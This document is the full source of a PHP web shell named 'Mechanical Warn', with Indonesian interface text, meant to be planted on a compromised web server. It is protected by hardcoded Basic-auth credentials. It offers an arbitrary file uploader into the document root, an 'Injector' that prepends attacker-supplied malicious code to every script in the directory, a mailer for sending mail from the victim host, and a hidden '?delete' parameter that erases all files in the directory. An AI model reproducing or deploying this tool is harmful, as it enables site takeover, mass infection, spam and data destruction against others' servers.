<?php 
$user = "hieki";
$pass = "password";

 if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass)){
  header("WWW-Authenticate: Basic realm=\"Mechanical Warn\"");
  header("HTTP/1.0 401 Unauthorized");
  exit();
 } ?>
<title><?=$_SERVER['HTTP_HOST'] . " - V1"; ?></title>
<font color="red"><body bgcolor="black"><div align="center"><pre>
+------------------------+
Mechanical Warn | mh@nkk
+------------------------+
<br>
#[Uname]: <?php echo php_uname() . "
"; ?>
#[Server]: <?=$_SERVER['HTTP_HOST'] . "
"; ?>
#[dir]: <?php echo getcwd(); ?>/<?php $current_file_name = basename($_SERVER['PHP_SELF']);
echo $current_file_name . "
"; ?>
</pre>
<br><font><center>|<a href="?injector">Injector</a>|<a href="?mailer">Mailer</a>|<a href="?uploader">Uploader</a>|</center></font><br>
<!--//Uploader -->
<?php if(isset($_GET['uploader'])){echo "<form method='post' enctype='multipart/form-data'><input type='file' name='idx_file'><input type='submit' name='upload' value='upload'></form>";} ?>
<?php
$root = $_SERVER['DOCUMENT_ROOT'];
$files = @$_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "sukses upload => <a href='$web/$files' target='_blank'><u>$web/$files</u></a>";} 
		else {echo "gagal upload di document root.";}}
				else {
		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
			echo "sukses upload <b>$files</b> di folder ini";}
		else {echo "gagal upload";}}} ?>
<!--//End Uploader -->

<!--//Injector-->
<?php if(isset($_GET['injector'])){echo '<br><center><br><font>Injector Code</font><br><br><form action="" method="POST"><textarea type="text" name="code" rows="13" cols="80" placeholder="Injector Code"></textarea><br><br><input type="submit" name="submit" value="Submit" /></form></div>';} ?>
            <?php 
            if (isset($_POST['submit'])) {
                $gwk = $_POST['code'];$blv = base64_encode($gwk);
                $cwd = getcwd();$tol = 'http://'.$_SERVER['HTTP_HOST'];
                $crotz = $_SERVER['DOCUMENT_ROOT'];
                $kon = $tol.$crotz;
                $cwd = getcwd();
                $ntpz = $cwd;
                if (empty($gwk)) {
                    echo '<font color=\'red\'>Masukan Malcode mu!!! :P</font>';}
                    if (!empty($gwk)) {
                        if ($pasi = opendir($ntpz)) {
                            echo 'Website: '.$kon.'<br><br>';echo 'Looking in '.$ntpz.'';
                            while ($ken2 = readdir($pasi)) {
                                if ($ken2 != '.' && $ken2 != '..' && $ken2 != 'rev.php' && $ken2 != 'REV.php' && $ken2 != '.htaccess' && $ken2 != 'php.ini' && $ken2 != 'admin' && $ken2 != 'images' && $ken2 != 'image' && $ken2 != 'img' && $ken2 != 'phpmyadmin' && $ken2 != 'files' && $ken2 != '.ftpquota' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'xml' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'jpg' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'ico' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'png' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'jpeg' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'txt' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'exe' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'html' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'shtml' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'htm' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'ico' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'css' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'zip' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'sql' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'js' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'py' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'pl' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'md' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'gif' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'tar.gz' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'c' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'sql.zip' && 
                                strtolower(substr($ken2, strrpos($ken2, '.') + 1)) != 'out') {
                                    echo '<center><a target="_blank" href="'.$ken2.'">'.$ken2.'</a><font>&nbsp;&nbsp;&nbsp&nbsp;Is Injected</font><br />';
                            $jmb = base64_decode($blv);
                            $jmb .= file_get_contents($ken2);
                        file_put_contents($ken2, $jmb); 
                    echo '</center>';} }}}}?><br><br>
<!--//End Injector-->

<!--//Mailer-->
<?php if(isset($_GET['mailer'])){
echo '<html><body><center><form method="post" action=""><font>Mailer</font><br><br><label  for="tujuan">For :</label><input  type="text" id="tujuan" name="tujuan" placeholder="kim@mail.com"/><br><label  for="subjek">Subject :</label><input  type="text" id="subjek" name="subjek"/><br><textarea name="pesan" id="pesan" rows="10" cols="30">Message</textarea><input type="hidden" name="send"><br><button id="Send">Send</button></form></center>';}?>
<?php
  if(@isset($_POST['send'])){
    ini_set( 'display_errors', 1 );   
    error_reporting( E_ALL );    
    $from    = 'mh@nkk';    
    $to      = $_POST['tujuan'];
    $subject = $_POST['subjek'];
    $message = $_POST['pesan'];   
    $headers = "From:" . $from;    
    mail($to,$subject,$message, $headers);    
    echo "Pesan email sudah terkirim ke ".$to."";
  }
?><!--//End Mailer-->
<?php 
if (isset($_GET['delete'])) {
$path    = getcwd();
$files = scandir($path);
foreach($files as $file){ 
  if(is_file($file))
    unlink($file); 
}
}
?>
